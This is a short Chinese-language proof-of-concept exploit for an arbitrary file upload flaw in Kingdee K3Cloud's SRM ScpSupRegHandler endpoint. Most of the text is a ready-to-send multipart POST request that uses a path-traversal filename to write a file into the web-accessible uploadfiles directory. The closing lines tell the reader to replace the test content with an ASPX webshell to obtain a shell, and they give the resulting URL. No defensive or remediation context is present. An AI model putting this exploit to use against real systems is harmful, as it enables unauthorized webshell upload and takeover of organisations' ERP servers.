# -
访问接口  
http://127.0.0.1/k3cloud/SRM/ScpSupRegHandler  

POC：  
POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1  
Host: 127.0.0.1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0   
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8   
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2   
Accept-Encoding: gzip, deflate, br  
Connection: keep-alive  
Upgrade-Insecure-Requests: 1  
Sec-Fetch-Dest: document  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Site: none  
Sec-Fetch-User: ?1  
Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061  
Content-Length: 1782  
--2ac719f8e29343df94aa4ab49e456061  
Content-Disposition: form-data; name="dbId_v"  
  
.  
--2ac719f8e29343df94aa4ab49e456061  
Content-Disposition: form-data; name="FID"  
  
2023  
--2ac719f8e29343df94aa4ab49e456061  
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/kingdee.txt"  
Content-Type: text/plain  
  
test  
--2ac719f8e29343df94aa4ab49e456061—-  

上传成功访问路径  
http://127.0.0.1/k3cloud/uploadfiles/kingdee.txt  
替换poc内上传内容为aspx马，提交上传getshell  
http://127.0.0.1/k3cloud/uploadfiles/kingdee.aspx
